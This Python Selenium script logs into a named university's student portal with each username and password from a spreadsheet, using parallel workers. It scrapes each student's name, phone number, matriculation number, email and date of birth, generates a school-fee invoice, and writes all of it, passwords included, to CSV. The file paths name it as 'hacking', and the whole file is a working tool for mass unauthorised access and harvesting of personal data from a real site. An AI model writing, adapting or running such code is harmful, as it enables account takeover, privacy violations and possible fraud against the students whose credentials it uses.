import os
import time
import pandas as pd
import concurrent.futures
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, ElementClickInterceptedException

def login_and_get_profile_info(username, password):
    # Set up chromedriver path
    chromedriver_path = '/opt/homebrew/bin/chromedriver'
    os.environ['PATH'] += os.pathsep + chromedriver_path

    # Configure ChromeOptions for headless mode
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")

    driver = webdriver.Chrome(options=options)
    try:
        # --- LOGIN ---
        driver.get('https://portal.esut.edu.ng/Login.aspx')
        username_field = driver.find_element(By.ID, 'txtLoginUsername')
        password_field = driver.find_element(By.ID, 'txtLoginPassword')
        login_button = driver.find_element(By.ID, 'btnLogin')

        username_field.send_keys(username)
        password_field.send_keys(password)
        login_button.click()

        # Allow some time for login to process
        time.sleep(2)

        # --- VERIFY LOGIN VIA PROFILE PAGE ---
        # Navigate to biodata/profile page; if login failed, expected elements won’t be found.
        driver.get('https://portal.esut.edu.ng/modules/ProfileDetails/Biodata.aspx')
        try:
            surname_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, 'ContentPlaceHolder1_txtSurname'))
            )
        except TimeoutException:
            print(f"Login failed for {username}: biodata page did not load as expected.")
            return None

        # Get remaining biodata elements (if any wait is needed, you can wrap these in WebDriverWait too)
        firstname_element = driver.find_element(By.ID, 'ContentPlaceHolder1_txtFirstname')
        middlename_element = driver.find_element(By.ID, 'ContentPlaceHolder1_txtMiddlename')
        phone_number_element = driver.find_element(By.ID, 'ContentPlaceHolder1_wmeMobileno')
        matric_number_element = driver.find_element(By.ID, 'ContentPlaceHolder1_txtMatricNo')
        department_element = driver.find_element(By.ID, 'ContentPlaceHolder1_ddlDepartment')
        email_element = driver.find_element(By.ID, 'ContentPlaceHolder1_txtEmail')
        date_of_birth_element = driver.find_element(By.ID, 'ContentPlaceHolder1_rdpDateofBirth_input')

        surname = surname_element.get_attribute('value')
        firstname = firstname_element.get_attribute('value')
        middlename = middlename_element.get_attribute('value')
        phone_number = phone_number_element.get_attribute('value')
        matric_number = matric_number_element.get_attribute('value')
        # Get the currently selected department option text
        department = department_element.find_element(By.CSS_SELECTOR, 'option[selected="selected"]').text
        email = email_element.get_attribute('value')
        date_of_birth = date_of_birth_element.get_attribute('value')

        # --- GENERATE INVOICE ---
        driver.get('https://portal.esut.edu.ng/modules/schoolfees/getinvoice.aspx?idx=SCHF')

        # Handle the modal popup: click confirm and wait for it to vanish
        try:
            confirm_button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.CLASS_NAME, "swal-button--confirm"))
            )
            confirm_button.click()
            WebDriverWait(driver, 10).until(
                EC.invisibility_of_element_located((By.CLASS_NAME, "swal-modal"))
            )
        except TimeoutException:
            print(f"{username}: Modal not found or already closed.")

        # Wait for and click the session dropdown
        session_dropdown = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, 'ddlSession'))
        )
        try:
            session_dropdown.click()
        except ElementClickInterceptedException:
            WebDriverWait(driver, 10).until(
                EC.invisibility_of_element_located((By.CLASS_NAME, "swal-modal"))
            )
            session_dropdown.click()

        # Select the 2024-2025 session (option with value "26")
        session_dropdown.find_element(By.XPATH, "//option[@value='26']").click()

        # Click the "Generate" button
        generate_button = driver.find_element(By.ID, 'Button1')
        generate_button.click()

        # Wait for the invoice number element to appear
        try:
            invoice_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, 'lblRefNo'))
            )
            invoice_number = invoice_element.text
        except TimeoutException:
            print(f"Invoice number not found for {username}. Skipping...")
            return None

        # Return the collected data as a dictionary
        return {
            'Username': username,
            'Password': password,
            'Surname': surname,
            'Firstname': firstname,
            'Middlename': middlename,
            'Phone': phone_number,
            'MatricNumber': matric_number,
            'Department': department,
            'Email': email,
            'DateOfBirth': date_of_birth,
            'InvoiceNumber': invoice_number
        }
    except Exception as e:
        print(f"Exception for {username}: {str(e)}")
        return None
    finally:
        driver.quit()

def process_account(row):
    username = row['username']
    password = row['password']
    return login_and_get_profile_info(username, password)

if __name__ == "__main__":
    # Load account data from Excel
    excel_file_path = '/Users/azubuike/Downloads/Hack/esuthacking/esuthacking/2023 ENG.xlsx'
    accounts_df = pd.read_excel(excel_file_path)

    # Specify the CSV output path
    output_file_path = '/Users/azubuike/Downloads/Hack/esuthacking/esuthacking/2023.csv'
    results = []

    # Process accounts concurrently (adjust max_workers based on your system)
    with concurrent.futures.ProcessPoolExecutor(max_workers=10) as executor:
        for profile_info in executor.map(process_account, [row for _, row in accounts_df.iterrows()]):
            if profile_info is not None:
                results.append(profile_info)
                # Save incrementally (optional; be cautious with concurrent writes)
                pd.DataFrame(results).to_csv(output_file_path, index=False)
                print(f"Saved valid account: {profile_info['Username']}")
            else:
                print("Account failed or login unsuccessful.")

    # Final save of all results
    final_df = pd.DataFrame(results)
    final_df.to_csv(output_file_path, index=False)
    print("Finished processing all accounts.")
